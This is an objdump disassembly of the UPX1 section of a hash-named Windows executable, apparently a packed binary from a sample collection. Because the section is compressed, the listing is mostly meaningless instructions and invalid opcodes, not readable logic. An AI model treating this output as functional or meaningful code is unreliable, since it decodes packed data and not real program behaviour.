
79e64922b8d9b22bf1b9300ffaaeef0ebdf73dbfa4838ed12a7565481c74a88b.exe:     file format pei-i386


Disassembly of section UPX1:

00482000 <UPX1>:
  482000:	out    dx,eax
  482001:	cpuid  
  482003:	nop
  482004:	add    BYTE PTR [eax+0x40],dh
  482007:	or     al,BYTE PTR [eax]
  482009:	add    al,0x2f
  48200b:	ja     0x481fa0
  48200d:	dec    edi
  48200e:	inc    BYTE PTR [ebp+eax*4-0x7a84ffb7]
  482015:	dec    ecx
  482016:	rol    BYTE PTR [eax+0x4],0x4f
  48201a:	inc    edi
  48201b:	xchg   BYTE PTR [ecx-0x41],cl
  48201e:	pop    edi
  48201f:	jae    0x481fb1
  482021:	add    BYTE PTR [eax],bh
  482023:	xchg   DWORD PTR [edi],ebp
  482025:	push   es
  482026:	add    BYTE PTR cs:[edi+ebx*1],dl
  48202a:	add    cl,BYTE PTR [ecx+0x3767cf7b]
  482030:	int    0x88
  482032:	dec    ecx
  482033:	imul   edx,DWORD PTR [ecx],0x40
  482036:	add    BYTE PTR [edi],al
  482038:	mov    ds:0xed06b43e,al
  48203d:	imul   edi,DWORD PTR [esi],0xa7ffc2cf
  482043:	mov    BYTE PTR [ebx+0x6cac4fc5],dh
  482049:	mov    edi,0xe01bb
  48204e:	or     BYTE PTR [edi],cl
  482050:	or     BYTE PTR [esi+ebp*1+0x428e8c5b],0x1d
  482058:	mov    dl,0xbd
  48205a:	fnstsw WORD PTR [edx-0x4630f9be]
  482060:	nop
  482061:	pop    esi
  482062:	xchg   edx,eax
  482063:	nop
  482064:	inc    eax
  482065:	jbe    0x48203f
  482067:	xor    eax,0xaa772f87
  48206c:	adc    al,BYTE PTR [esi]
  48206e:	jg     0x482021
  482070:	lods   al,BYTE PTR ds:[esi]
  482071:	scas   al,BYTE PTR es:[edi]
  482072:	ja     0x4820ed
  482074:	aas    
  482075:	leave  
  482076:	mov    BYTE PTR [edi+edi*8+0x40107425],ch
  48207d:	or     bh,BYTE PTR [eax+0x2e5e17d4]
  482083:	xchg   edi,eax
  482084:	retf   
  482085:	push   esp
  482086:	cmp    al,0xfc
  482088:	sub    BYTE PTR [ecx+edx*1],dl
  48208b:	retf   
  48208c:	ja     0x482047
  48208e:	push   esp
  48208f:	pop    eax
  482090:	adc    BYTE PTR [eax],al
  482092:	and    ecx,esp
  482094:	in     al,0xbb
  482096:	pop    esp
  482097:	mov    esi,0x2cc80b90
  48209c:	add    al,0x53
  48209e:	cmp    BYTE PTR [ecx+0x175f2efc],ch
  4820a4:	pop    esp
  4820a5:	in     al,dx
  4820a6:	das    
  4820a7:	push   0xca97a810
  4820ac:	out    dx,eax
  4820ad:	jb     0x4820ff
  4820af:	dec    esp
  4820b0:	or     eax,DWORD PTR [eax-0x465b83f0]
  4820b6:	push   esp
  4820b7:	pop    esi
  4820b8:	mov    WORD PTR cs:[eax+0x11],es
  4820bc:	dec    eax
  4820bd:	pusha  
  4820be:	retf   
  4820bf:	in     eax,0x52
  4820c1:	jns    0x482107
  4820c3:	adc    al,dh
  4820c5:	adc    al,0xb4
  4820c7:	mov    ebx,0x4c972e5c
  4820cc:	adc    BYTE PTR [eax+esi*4],ah
  4820cf:	xor    al,0x6b
  4820d1:	cs xchg edi,eax
  4820d3:	retf   
  4820d4:	in     eax,0xe0
  4820d6:	fs pop esp
  4820d8:	pusha  
  4820d9:	clc    
  4820da:	in     eax,0x72
  4820dc:	mov    ecx,0x301c505c
  4820e1:	inc    esp
  4820e2:	mov    ebx,0xf4df2e5c
  4820e7:	and    ebp,DWORD PTR [eax+ecx*1-0x7c]
  4820eb:	sbb    BYTE PTR [ebx],cl
  4820ed:	pop    esp
  4820ee:	mov    esi,0x2070e5cb
  4820f3:	mov    BYTE PTR [ebx-0x68],dl
  4820f6:	add    al,0x5d
  4820f8:	mov    esi,0xb0cbbec
  4820fd:	or     BYTE PTR [ebx+0x5c48d817],dh
  482103:	mov    esi,0xe80bf7cb
  482108:	das    
  482109:	cmp    al,0xc4
  48210b:	and    edx,eax
  48210d:	pop    eax
  48210e:	pop    ss
  48210f:	(bad)  
  482111:	mov    ebx,0xdc200b24
  482116:	das    
  482117:	pushf  
  482118:	pop    edi
  482119:	in     eax,0xfb
  48211b:	and    dl,BYTE PTR [edi+0x343be438]
  482121:	pop    ss
  482122:	sub    BYTE PTR [esi],bl
  482124:	pop    esp
  482125:	mov    esi,0x23c094cb
  48212a:	xor    BYTE PTR [edi+ebx*1+0x32f9722c],bh
  482131:	inc    esp
  482132:	lahf   
  482133:	or     ebp,DWORD PTR [eax+edi*2-0x1063880d]
  48213a:	mov    al,ds:0x688a1847
  48213f:	call   0xe8486159
  482144:	push   cs
  482145:	fbld   TBYTE PTR [ecx+0x34]
  482148:	inc    edi
  482149:	dec    esp
  48214a:	dec    edi
  48214b:	xor    BYTE PTR [edi-0x6bb23199],dl
  482151:	mov    bh,0x37
  482153:	sti    
  482154:	call   esi
  482156:	or     DWORD PTR [edx],0x5aa54572
  48215c:	mov    ah,0xa9
  48215e:	test   al,0xf0
  482160:	pop    eax
  482161:	clc    
  482162:	sub    eax,DWORD PTR [ecx]
  482164:	push   es
  482165:	dec    edx
  482166:	pop    esi
  482167:	push   eax
  482168:	add    eax,DWORD PTR [ecx]
  48216a:	stc    
  48216b:	std    
  48216c:	je     0x48216d
  48216e:	push   edx
  48216f:	imul   edx,DWORD PTR [ebp+0x5a],0x33e006d
  482176:	sub    eax,DWORD PTR [edi]
  482178:	dec    eax
  482179:	inc    edi
  48217a:	inc    edi
  48217b:	js     0xbc11dbc6
  482181:	scas   eax,DWORD PTR es:[edi]
  482182:	add    DWORD PTR [edx],eax
  482184:	and    al,0x53
  482186:	ret    0xff00
  482189:	pop    ss
  48218a:	test   al,0x3e
  48218c:	nop
  48218d:	aas    
  48218e:	std    
  48218f:	es xor al,0xc0
  482192:	dec    ecx
  482193:	jmp    0x482115
  482195:	mov    ebp,0x4014e82e
  48219a:	dec    edi
  48219b:	sahf   
  48219c:	add    esi,esi
  48219e:	mov    ebx,0x6008786f
  4821a3:	pushf  
  4821a4:	add    BYTE PTR [ecx+0x202c903c],ch
  4821aa:	adc    eax,0x4eebb503
  4821af:	repz or BYTE PTR [esp+edx*2-0x51],dl
  4821b4:	pop    eax
  4821b5:	dec    esi
  4821b6:	add    DWORD PTR [eax+eiz*2],edi
  4821b9:	movsx  ebx,BYTE PTR [edi]
  4821bc:	mov    al,0xa3
  4821be:	add    dh,BYTE PTR [edi-0x28]
  4821c1:	push   ebx
  4821c2:	daa    
  4821c3:	pop    ss
  4821c4:	jb     0x482198
  4821c6:	inc    esp
  4821c7:	xchg   esp,eax
  4821c8:	xchg   esp,eax
  4821c9:	push   eax
  4821ca:	dec    eax
  4821cb:	(bad)  
  4821cc:	call   FWORD PTR [edi-0x66]
  4821cf:	pop    esi
  4821d0:	adc    DWORD PTR [ecx+0x7b1e6ec9],edx
  4821d6:	inc    ecx
  4821d7:	mov    esi,0xf6215888
  4821dc:	mov    cl,0x93
  4821de:	cli    
  4821df:	fld    DWORD PTR [ebx]
  4821e1:	xchg   esi,eax
  4821e2:	push   0x4
  4821e4:	mov    cl,0x1
  4821e6:	push   0x7f600f6e
  4821eb:	or     eax,ebx
  4821ed:	fdivr  DWORD PTR [ecx+0x66]
  4821f0:	add    eax,0x21354256
  4821f5:	lock pop ds
  4821f7:	sub    al,BYTE PTR [edi-0x5b]
  4821fa:	jmp    0x9e2:0x1b7eec1a
  482201:	in     eax,0xf
  482203:	fdiv   DWORD PTR cs:[esi+edx*4-0x7b]
  482208:	je     0x482220
  48220a:	push   cs
  48220b:	xchg   edi,eax
  48220c:	lock xor BYTE PTR [ecx+0x8],dh
  482210:	cmp    DWORD PTR [eax],edi
  482212:	rcl    BYTE PTR ds:0xe906013b,0x46
  482219:	cwde   
  48221a:	repz sahf 
  48221c:	xchg   esi,esi
  48221e:	mov    WORD PTR [edx],gs
  482220:	push   es
  482221:	fs scas al,BYTE PTR es:[edi]
  482223:	js     0x4822a4
  482225:	push   es
  482226:	test   al,bl
  482228:	call   DWORD PTR [edi-0x3f]
  48222b:	test   DWORD PTR [edi],ecx
  48222d:	pop    ecx
  48222e:	inc    edi
  48222f:	pop    eax
  482230:	push   edi
  482231:	push   ebp
  482232:	pop    ecx
  482233:	add    BYTE PTR [edx+0x57],ch
  482236:	jbe    0x48228c
  482238:	sbb    BYTE PTR [edx],cl
  48223a:	dec    esi
  48223b:	lds    edx,FWORD PTR [ebx-0x4f]
  48223e:	add    ah,dh
  482240:	add    DWORD PTR [edi],edx
  482242:	adc    cl,ch
  482244:	ds loopne 0x482246
  482247:	out    dx,al
  482248:	mov    edi,DWORD PTR [edi+0xbb09e]
  48224e:	cmovbe edx,DWORD PTR [edx]
  482251:	cs push cs
  482253:	sub    al,BYTE PTR [eax]
  482255:	pop    esp
  482256:	add    BYTE PTR [ecx-0x48],al
  482259:	or     DWORD PTR [esi+0x6300f3],esi
  48225f:	cmp    al,BYTE PTR [edx+0x65]
  482262:	add    BYTE PTR [eax+ecx*4-0x25acffb1],bl
  482269:	(bad)  ds:0x361eb667
  48226f:	jb     0x482271
  482271:	outs   dx,DWORD PTR ds:[esi]
  482272:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  482273:	sub    bh,BYTE PTR [esi]
  482275:	je     0x4822c8
  482277:	aam    0x7e
  482279:	add    esi,DWORD PTR [edx]
  48227b:	jbe    0x48227d
  48227d:	bound  eax,QWORD PTR [eax]
  48227f:	jo     0x482281
  482281:	add    ebx,esp
  482283:	js     0x482279
  482285:	xor    DWORD PTR [eax+0x40702d6],esp
  48228b:	ja     0x4822d6
  48228d:	jae    0x482237
  48228f:	int3   
  482290:	push   esp
  482291:	call   0x649c5b95
  482296:	in     al,dx
  482297:	xchg   ecx,eax
  482298:	pop    es
  482299:	repnz pop eax
  48229b:	adc    eax,0x7c19282f
  4822a0:	imul   eax,DWORD PTR [edi+0x1f],0xf
  4822a4:	jns    0x4822d4
  4822a6:	pop    ds
  4822a7:	xor    BYTE PTR [ecx],bl
  4822a9:	inc    eax
  4822aa:	sub    al,0x1d
  4822ac:	mov    bh,0x1
  4822ae:	jnp    0x4822ef
  4822b0:	mov    dl,0xfd
  4822b2:	push   0xb8006c00
  4822b7:	sbb    eax,0xa8c4b49e
  4822bc:	loop   0x4822b9
  4822be:	add    ecx,DWORD PTR [esi+esi*2-0x1b68f964]
  4822c5:	jae    0x48227c
  4822c7:	sub    bl,BYTE PTR [edi]
  4822c9:	into   
  4822ca:	imul   BYTE PTR [ebx+ebp*2-0x2497f900]
  4822d1:	jg     0x482332
  4822d3:	cmp    dl,bh
  4822d5:	lock add edi,DWORD PTR [edi+ebp*1+0x34df1a1a]
  4822dd:	xchg   DWORD PTR [ebp+0x1e69fcda],edi
  4822e3:	or     eax,DWORD PTR [esi+0x481e4c4f]
  4822e9:	call   0x2f6a:0xcfb2dcf
  4822f0:	dec    esi
  4822f1:	adc    eax,DWORD PTR [eax]
  4822f3:	cmp    al,0x18
  4822f5:	push   0x2
  4822f7:	ins    DWORD PTR es:[edi],dx
  4822f8:	jnp    0x482298
  4822fa:	dec    ebx
  4822fb:	int3   
  4822fc:	pop    eax
  4822fd:	sub    BYTE PTR [edi],ch
  4822ff:	dec    esi
  482300:	adc    DWORD PTR [edx+0xcf3c97],ebx
  482306:	inc    eax
  482307:	xor    BYTE PTR [eax+esi*1],cl
  48230a:	pop    ds
  48230b:	push   0x7b6e93b5
  482310:	inc    eax
  482311:	das    
  482312:	out    dx,eax
  482313:	inc    esp
  482314:	or     eax,0x3cf2f94f
  482319:	iret   
  48231a:	mov    WORD PTR [eax+0x4c],cs
  48231d:	or     eax,0xa7480018
  482322:	jns    0x48236d
  482324:	repz aam 0x6b
  482327:	push   es
  482328:	or     al,0x20
  48232a:	js     0x48235a
  48232c:	cmp    ecx,ebp
  48232e:	mov    dh,0xe4
  482330:	das    
  482331:	dec    edi
  482332:	dec    esp
  482333:	add    eax,0xdba4e484
  482338:	dec    esi
  482339:	in     al,dx
  48233a:	das    
  48233b:	dec    edi
  48233c:	push   eax
  48233d:	adc    dl,BYTE PTR [ebx-0x346c425]
  482343:	pop    eax
  482344:	out    dx,al
  482345:	adc    cl,BYTE PTR [edi+0x54]
  482348:	fistp  QWORD PTR [ebx]
  48234a:	repnz xchg edx,eax
  48234c:	push   cs
  48234d:	je     0x482370
  48234f:	adc    BYTE PTR [edi+0x2f],ch
  482352:	dec    edi
  482353:	pop    eax
  482354:	iret   
  482355:	leave  
  482356:	and    eax,0x18ec1027
  48235b:	adc    ah,ah
  48235d:	and    eax,0x35c2727
  482362:	fs and dl,dl
  482365:	jl     0x4823d6
  482367:	jbe    0x4823a9
  482369:	jo     0x48239a
  48236b:	inc    eax
  48236c:	cli    
  48236d:	pusha  
  48236e:	dec    esi
  48236f:	dec    eax
  482370:	jo     0x482387
  482372:	frstor [esi-0x10]
  482375:	pop    esp
  482376:	fmul   QWORD PTR [eax+0x644f2f3f]
  48237c:	ja     0x482362
  48237e:	and    eax,0x233c1627
  482383:	test   BYTE PTR [ecx+0x2f],dh
  482386:	cmp    al,0xd7
  482388:	dec    esi
  482389:	mov    esi,0x4f1168ef
  48238e:	pushf  
  48238f:	js     0x482323
  482391:	xchg   ebx,eax
  482392:	fcomi  st,st(3)
  482394:	mov    WORD PTR [ecx],ss
  482396:	lahf   
  482397:	ins    BYTE PTR es:[edi],dx
  482398:	sbb    edx,DWORD PTR [ebx+0x14f23793]
  48239e:	and    al,0x94
  4823a0:	dec    esi
  4823a1:	sbb    esi,DWORD PTR [eax-0x42]
  4823a4:	mul    esp
  4823a6:	xchg   edx,eax
  4823a7:	sbb    DWORD PTR [esp+ecx*8+0x72],esi
  4823ab:	das    
  4823ac:	dec    edi
  4823ad:	je     0x48234d
  4823af:	xchg   ebx,eax
  4823b0:	dec    ebx
  4823b1:	dec    esi
  4823b2:	sbb    ah,dl
  4823b4:	aam    0x18
  4823b6:	xchg   edi,eax
  4823b7:	xor    al,0x1f
  4823b9:	dec    esi
  4823ba:	js     0x48243a
  4823bc:	or     BYTE PTR [edx+ebx*1+0x34],dh
  4823c0:	xchg   ebx,eax
  4823c1:	outs   dx,BYTE PTR ds:[esi]
  4823c2:	push   ebx
  4823c3:	call   0x837c:0x4f2f9825
  4823ca:	mul    esp
  4823cc:	xchg   edx,eax
  4823cd:	pop    ss
  4823ce:	xchg   esp,eax
  4823cf:	cwde   
  4823d0:	jbe    0x482401
  4823d2:	fistp  WORD PTR [esi-0x7f362519]
  4823d8:	cmovg  esi,esp
  4823db:	js     0x48237d
  4823dd:	dec    ebx
  4823de:	dec    esi
  4823df:	cs js  0x4823f1
  4823e2:	aas    
  4823e3:	test   BYTE PTR [esp+ebx*4],bl
  4823e6:	jl     0x4823d7
  4823e8:	enter  0x266c,0xe0
  4823ec:	ja     0x48241d
  4823ee:	lahf   
  4823ef:	mov    BYTE PTR [ebx],dl
  4823f1:	stc    
  4823f2:	ficom  WORD PTR [ecx-0x43d93369]
  4823f8:	ins    DWORD PTR es:[edi],dx
  4823f9:	das    
  4823fa:	dec    edi
  4823fb:	mov    WORD PTR [ebx+eiz*1],?
  4823fe:	das    
  4823ff:	cmp    DWORD PTR [esp+eax*2],eax
  482402:	daa    
  482403:	les    eax,FWORD PTR [edi+eiz*1]
  482406:	xchg   edi,eax
  482407:	pushf  
  482408:	pushf  
  482409:	nop
  48240a:	or     DWORD PTR [esp+ecx*8+0x3c9c9c97],edi
  482411:	or     DWORD PTR [edx+ecx*1-0x61b1b1cc],edx
  482418:	xchg   ecx,eax
  482419:	sub    ah,dl
  48241b:	or     bl,BYTE PTR [eax-0x6c2106ec]
  482421:	dec    ebx
  482422:	lods   al,BYTE PTR ds:[esi]
  482423:	pusha  
  482424:	push   0x3c9c4f2f
  482429:	and    ebp,DWORD PTR [edi]
  48242b:	cmp    DWORD PTR [eax],ecx
  48242d:	and    al,0x29
  48242f:	ins    BYTE PTR es:[edi],dx
  482430:	or     BYTE PTR [edi],ah
  482432:	xchg   edi,eax
  482433:	pushf  
  482434:	pushf  
  482435:	mov    al,ds:0x97749c07
  48243a:	pushf  
  48243b:	pushf  
  48243c:	cmp    al,0x7
  48243e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  48243f:	add    DWORD PTR [edi*4+0x2a91db00],edx
  482446:	jl     0x4824b0
  482448:	das    
  482449:	pop    edi
  48244a:	mov    al,0x18
  48244c:	push   ebp
  48244d:	cmp    ecx,DWORD PTR [edi-0x4d]
  482450:	push   es
  482451:	ds adc al,0x44
  482454:	dec    edx
  482455:	add    eax,ebx
  482457:	inc    ebp
  482458:	adc    eax,0x8027580c
  48245d:	push   DWORD PTR [eax+0x45]
  482460:	in     al,dx
  482461:	stos   BYTE PTR es:[edi],al
  482462:	test   al,0xc7
  482464:	ror    BYTE PTR [ebx],1
  482466:	push   0x17
  482468:	aad    0x7f
  48246a:	clc    
  48246b:	jmp    DWORD PTR [eax+0x20da8264]
  482471:	sbb    ch,bh
  482473:	dec    eax
  482474:	dec    edx
  482475:	sub    BYTE PTR cs:[ecx-0x7d1b6790],bh
  48247c:	xchg   edx,eax
  48247d:	or     eax,eax
  48247f:	call   0x2905aeab
  482484:	adc    BYTE PTR [ebx],bl
  482486:	mov    edi,0x36281b38
  48248b:	inc    ecx
  48248c:	or     eax,0x51ef606f
  482491:	pop    esp
  482492:	adc    al,0xbb
  482494:	mov    BYTE PTR [edi+0x54312fb0],bh
  48249a:	enter  0xd845,0x1c
  48249e:	adc    BYTE PTR [edx+0x28afc513],0x1c
  4824a5:	dec    edx
  4824a6:	mov    ah,BYTE PTR cs:[eax+0x50]
  4824aa:	scas   eax,DWORD PTR es:[edi]
  4824ab:	js     0x482476
  4824ad:	add    eax,0xefa00bb5
  4824b2:	enter  0x505e,0x72
  4824b6:	inc    ecx
  4824b7:	lock sbb BYTE PTR ds:0x4a099282,bl
  4824be:	inc    eax
  4824bf:	and    bh,BYTE PTR [ecx-0x6f971b60]
  4824c5:	sahf   
  4824c6:	out    0x69,eax
  4824c8:	scas   eax,DWORD PTR es:[edi]
  4824c9:	rol    BYTE PTR [ecx],0x1e
  4824cc:	cmp    al,dl
  4824ce:	clc    
  4824cf:	adc    bh,cl
  4824d1:	in     eax,dx
  4824d2:	cdq    
  4824d3:	jge    0x4824ed
  4824d5:	add    DWORD PTR [edi],esi
  4824d7:	dec    eax
  4824d8:	dec    eax
  4824d9:	dec    edi
  4824da:	nop
  4824db:	popf   
  4824dc:	std    
  4824dd:	std    
  4824de:	aas    
  4824df:	jns    0x482517
  4824e1:	mov    cl,0x15
  4824e3:	out    0x9d,eax
  4824e5:	mov    al,0xc1
  4824e7:	xchg   ecx,edx
  4824e9:	adc    DWORD PTR [ebx+0x4d756ee3],ecx
  4824ef:	mov    eax,ds:0x90bfff14
  4824f4:	mov    ebx,DWORD PTR [edi]
  4824f6:	adc    ebp,DWORD PTR [ebx]
  4824f8:	pushf  
  4824f9:	xchg   ebp,eax
  4824fa:	outs   dx,BYTE PTR ds:[esi]
  4824fb:	inc    ebp
  4824fc:	pop    eax
  4824fd:	nop
  4824fe:	inc    edx
  4824ff:	popf   
  482500:	push   esi
  482501:	push   0xfff82139
  482506:	push   DWORD PTR [esi-0x6]
  482509:	pop    es
  48250a:	daa    
  48250b:	xchg   ebx,eax
  48250c:	sbb    eax,0x2f899a51
  482511:	ja     0x482555
  482513:	mov    ch,0xd2
  482515:	(bad)  [edi]
  482517:	sub    DWORD PTR [esi-0x58c32f8a],eax
  48251d:	(bad)  
  48251e:	(bad)  
  48251f:	mov    edi,0xff8046f9
  482524:	lar    esp,WORD PTR [esi-0x26b16b3e]
  48252b:	sub    esp,DWORD PTR [eax]
  48252d:	dec    ecx
  48252e:	xchg   ebp,esp
  482530:	mov    al,ds:0xf76bacbe
  482535:	test   eax,0x367b62c4
  48253a:	inc    eax
  48253b:	(bad)  
  48253c:	xor    dh,dl
  48253e:	retf   0x1eff
  482541:	dec    edi
  482542:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  482543:	imul   ebx,DWORD PTR [eax+eiz*8],0xffffff83
  482547:	add    DWORD PTR ss:[eax+0x66],ebx
  48254b:	pop    ss
  48254c:	push   edi
  48254d:	xor    BYTE PTR [ebx],cl
  48254f:	add    ecx,DWORD PTR [ecx-0x5]
  482552:	push   es
  482553:	jl     0x48255b
  482555:	add    edx,DWORD PTR [esi]
  482557:	pop    es
  482558:	add    ch,cl
  48255a:	fist   DWORD PTR [esi+0x719af58]
  482560:	push   cs
  482561:	add    DWORD PTR [edx],edx
  482563:	jns    0x482503
  482565:	out    0x2f,eax
  482567:	test   al,0xfd
  482569:	(bad)  
  48256a:	jmp    DWORD PTR [edi-0x615e5d5d]
  482570:	out    0x79,eax
  482572:	dec    BYTE PTR [esi]
  482574:	push   es
  482575:	add    BYTE PTR [eax],al
  482577:	movups xmm2,XMMWORD PTR [ecx]
  48257a:	adc    dl,BYTE PTR [ebx]
  48257c:	pop    eax
  48257d:	ud0    edi,DWORD PTR [ebx+0x44]
  482581:	bound  esi,QWORD PTR [esi]
  482583:	add    BYTE PTR ds:0x41003100,dh
  482589:	xchg   esi,eax
  48258a:	cmp    DWORD PTR [ebp+0x56815fe7],edi
  482590:	sub    al,0x2d
  482592:	adc    dh,BYTE PTR [edi]
  482594:	add    BYTE PTR [ebx+0x0],al
  482597:	xor    eax,0xbe640231
  48259c:	fcomi  st,st(3)
  48259e:	fld    QWORD PTR [esi]
  4825a0:	daa    
  4825a1:	inc    edx
  4825a2:	add    BYTE PTR [ebp+0x0],al
  4825a5:	xor    esi,DWORD PTR [eax]
  4825a7:	add    eax,DWORD PTR [esi+0x4f]
  4825aa:	xor    eax,0xf76fff77
  4825af:	inc    sp
  4825b1:	jp     0x4825f9
  4825b3:	dec    ebp
  4825b4:	push   ebx
  4825b5:	inc    ebx
  4825b6:	dec    edi
  4825b7:	dec    ebp
  4825b8:	inc    ebx
  4825b9:	push   esp
  4825ba:	xor    ch,BYTE PTR [esi]
  4825bc:	dec    edi
  4825bd:	inc    ebx
  4825be:	pop    eax
  4825bf:	sbb    DWORD PTR [edi+0x6d],ebp
  4825c2:	inc    ebx
  4825c3:	mov    esi,0x74dbff69
  4825c8:	ins    BYTE PTR es:[edi],dx
  4825c9:	sbb    al,BYTE PTR [ecx+0x6e]
  4825cc:	imul   ebp,DWORD PTR [ebp+0x61],0x6e6f6974
  4825d3:	add    BYTE PTR [ebx],dl
  4825d5:	mov    ebx,0xf9b8bbec
  4825da:	xchg   ebx,eax
  4825db:	mov    ebp,DWORD PTR [eax]
  4825dd:	jg     0x48258d
  4825df:	cmp    BYTE PTR [esi+0x3c],0x60
  4825e3:	ret    0xc85f
  4825e6:	lds    ebp,FWORD PTR [esi]
  4825e8:	jg     0x482609
  4825ea:	jle    0x4825c2
  4825ec:	std    
  4825ed:	and    al,bh
  4825ef:	(bad)  
  4825f0:	(bad)  
  4825f1:	call   ecx
  4825f3:	ins    DWORD PTR es:[edi],dx
  4825f4:	push   eax
  4825f5:	aad    0x43
  4825f7:	stos   DWORD PTR es:[edi],eax
  4825f8:	mov    al,dh
  4825fa:	sti    
  4825fb:	cmp    ch,0xc8
  4825fe:	pop    edx
  4825ff:	cld    
  482600:	mov    eax,0x457e70cc
  482605:	out    0x4f,eax
  482607:	lods   al,BYTE PTR ds:[esi]
  482608:	sub    al,0x8d
  48260a:	iret   
  48260b:	fwait
  48260c:	xchg   esi,eax
  48260d:	je     0x4825d0
  48260f:	(bad)  
  482610:	(bad)  
  482611:	jg     0x4825bb
  482613:	jg     0x48259c
  482615:	sbb    al,0xb0
  482617:	(bad)  
  482618:	cld    
  482619:	adc    edx,ebp
  48261b:	dec    ebx
  48261c:	call   0x811c:0x842ac02e
  482623:	js     0x48263f
  482625:	mov    eax,0x8915565d
  48262a:	nop
  48262b:	dec    esp
  48262c:	enter  0xfbff,0x4c
  482630:	stos   BYTE PTR es:[edi],al
  482631:	repnz and BYTE PTR [ebx],0x41
  482635:	dec    ecx
  482636:	sub    ebx,DWORD PTR [edi-0x5520d5f4]
  48263c:	sbb    BYTE PTR [ebx+0x102d206],al
  482642:	push   esi
  482643:	adc    eax,0x6b5fca56
  482648:	xchg   DWORD PTR [ecx],ebp
  48264a:	jle    0x4825f4
  48264c:	sub    BYTE PTR [edi+0x55],bh
  48264f:	jo     0x482695
  482651:	outs   dx,DWORD PTR ds:[esi]
  482652:	ja     0x4826b8
  482654:	cmp    edx,DWORD PTR [ecx+0x2c]
  482657:	mov    eax,0x82a750d
  48265c:	add    ch,BYTE PTR [edi+0x20]
  48265f:	add    DWORD PTR [esi],eax
  482661:	iret   
  482662:	push   ebp
  482663:	cmp    al,0x4f
  482665:	sub    BYTE PTR [eax-0x72],dh
  482668:	outs   dx,DWORD PTR ds:[esi]
  482669:	(bad)  
  48266a:	jecxz  0x4826e2
  48266c:	leave  
  48266d:	lahf   
  48266e:	cmp    al,0xf7
  482670:	push   0x45
  482672:	cs and eax,ebx
  482675:	imul   ebx,DWORD PTR [edi],0x2e42ffff
  48267b:	gs fwait
  48267d:	dec    esp
  48267e:	shl    BYTE PTR [edx+0x3b],1
  482681:	out    0xae,al
  482683:	inc    ebp
  482684:	mov    eax,ds:0x13d2392d
  482689:	test   eax,0xffffc51c
  48268e:	or     DWORD PTR [esi+0x4d7855da],edx
  482694:	add    eax,0xbd4f4c11
  482699:	(bad)
  48269d:	jns    0x482644
  48269f:	pop    esi
  4826a0:	outs   dx,DWORD PTR ds:[esi]
  4826a1:	add    bh,bh
  4826a3:	(bad)  
  4826a4:	dec    esi
  4826a6:	(bad)
  4826a9:	dec    edx
  4826aa:	inc    edx
  4826ab:	in     eax,dx
  4826ac:	int3   
  4826ad:	inc    di
  4826af:	mov    ds:0xe53b7727,al
  4826b4:	fsub   QWORD PTR [edi+0x21960da0]
  4826ba:	push   cs
  4826bb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4826bc:	sbb    al,bh
  4826be:	dec    edi
  4826bf:	out    0x90,eax
  4826c1:	push   ss
  4826c2:	inc    DWORD PTR [edi-0x24a37ab8]
  4826c8:	leave  
  4826c9:	std    
  4826ca:	iret   
  4826cb:	outs   dx,DWORD PTR ds:[esi]
  4826cc:	jbe    0x4826e0
  4826ce:	inc    ebp
  4826cf:	jno    0x48267c
  4826d1:	nop
  4826d2:	add    DWORD PTR [eax],eax
  4826d4:	xchg   DWORD PTR ds:0x947be78a,eax
  4826da:	add    al,0xd
  4826dc:	fwait
  4826dd:	fwait
  4826de:	(bad)  
  4826df:	mov    ecx,0x2dca867a
  4826e4:	das    
  4826e5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4826e6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4826e7:	inc    esi
  4826e8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4826e9:	and    eax,ebp
  4826eb:	mov    eax,0x6561700
  4826f0:	pop    es
  4826f1:	adc    eax,0x113f77c5
  4826f6:	cmp    eax,DWORD PTR [ebx]
  4826f8:	pop    ds
  4826f9:	push   esi
  4826fa:	popa   
  4826fb:	ins    BYTE PTR es:[edi],dx
  4826fc:	jne    0x482763
  4826fe:	sti    
  4826ff:	sahf   
  482700:	not    BYTE PTR [edi+0xd]
  482703:	dec    ebp
  482704:	pop    edx
  482705:	je     0x48276f
  482707:	push   esi
  482708:	imul   esp,DWORD PTR [ebp+0x77],0x5791300
  48270f:	add    BYTE PTR [edx+0x6e388e7],dl
  482715:	vmread DWORD PTR [esi-0x10c1b81e],edx
  48271c:	ficomp WORD PTR [esi]
  48271e:	jmp    0x48271e
  482720:	add    DWORD PTR [esi-0x3bdf22e5],ebx
  482726:	pop    edi
  482727:	enter  0xaec5,0xcf
  48272b:	popf   
  48272c:	pop    ds
  48272d:	fwait
  48272e:	mov    bl,0xc3
  482730:	sbb    bh,bh
  482732:	(bad)  
  482733:	mov    edi,0x6d967ee0
  482738:	dec    esp
  482739:	xchg   esi,eax
  48273a:	cmp    al,0xb4
  48273c:	or     ah,dl
  48273e:	cwde   
  48273f:	add    bl,BYTE PTR [ecx-0x5e]
  482742:	push   ds
  482743:	lods   eax,DWORD PTR ds:[esi]
  482744:	daa    
  482745:	mov    ds:0xa640a54b,al
  48274a:	sub    ebp,DWORD PTR [ebx+edx*4]
  48274d:	lods   eax,DWORD PTR ds:[esi]
  48274e:	(bad)  
  482750:	inc    DWORD PTR [ebx-0x39]
  482753:	gs inc esi
  482755:	(bad)  
  482757:	jmp    0xc744c829
  48275c:	rol    BYTE PTR [esi-0x50],cl
  48275f:	sub    DWORD PTR [ebx],0xffb3478e
  482765:	mov    ch,0x73
  482767:	fs inc edx
  482769:	(bad)  
  48276a:	push   DWORD PTR [eax]
  48276c:	inc    ecx
  48276d:	xor    dh,ch
  48276f:	ret    0x4466
  482772:	mov    eax,0x38995f16
  482777:	sbb    dh,0xd3
  48277a:	adc    al,0xb6
  48277c:	add    eax,0x69faad5
  482781:	mov    ds:0xd0c7c906,eax
  482786:	jno    0x482797
  482788:	add    eax,0x73c9061e
  48278d:	leave  
  48278e:	adc    eax,0x3cd00c14
  482793:	idiv   BYTE PTR [edi]
  482795:	adc    BYTE PTR [esp+edx*2+0x50],al
  482799:	imul   esp,DWORD PTR [ebx+0x6b],0x11007265
  4827a0:	xchg   DWORD PTR [eax-0x1c],esp
  4827a3:	lods   eax,DWORD PTR ds:[esi]
  4827a4:	pop    eax
  4827a5:	or     ecx,DWORD PTR [esi-0x6127e9d9]
  4827ab:	push   ds
  4827ac:	xchg   ebx,eax
